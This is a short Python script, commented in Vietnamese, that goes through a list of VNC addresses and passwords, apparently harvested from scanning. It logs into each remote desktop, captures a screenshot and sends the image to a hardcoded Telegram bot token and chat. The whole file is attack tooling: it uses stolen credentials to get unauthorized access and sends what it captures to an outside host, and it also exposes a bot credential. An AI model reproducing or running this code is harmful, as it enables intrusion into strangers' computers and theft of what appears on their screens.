import os
import time
from vncdotool import api
from telegram import Bot

# Đọc file kết quả
with open('results.txt', 'r') as file:
    lines = file.readlines()

# Hàm để kiểm tra VNC và chụp ảnh
def check_vnc(ip, port, password, name):
    try:
        client = api.connect(f'{ip}::{port}', password=password)
        time.sleep(5)  # Đợi một lúc để kết nối
        # Nếu kết nối thành công, chụp ảnh màn hình
        image_path = f'{name}.png'
        client.captureScreen(image_path)
        client.disconnect()
        return image_path
    except Exception as e:
        print(f"Failed to connect to VNC {ip}:{port} with error: {e}")
        return None

# Hàm gửi ảnh qua Telegram
def send_telegram_photo(image_path, bot_token, chat_id):
    bot = Bot(token=bot_token)
    bot.send_photo(chat_id=chat_id, photo=open(image_path, 'rb'))

# Thông tin Telegram bot
bot_token = '6759371397:AAE-6AOTkgttCeYVp_X-xfNjT_cYH_0A38Q'
chat_id = '-1002069322619'

# Lặp qua các dòng và kiểm tra VNC
for line in lines:
    parts = line.strip().split('-')
    if len(parts) == 3:
        ip_port, password, name = parts
        ip, port = ip_port.split(':')
        image_path = check_vnc(ip, port, password, name)
        if image_path:
            send_telegram_photo(image_path, bot_token, chat_id)
            os.remove(image_path)
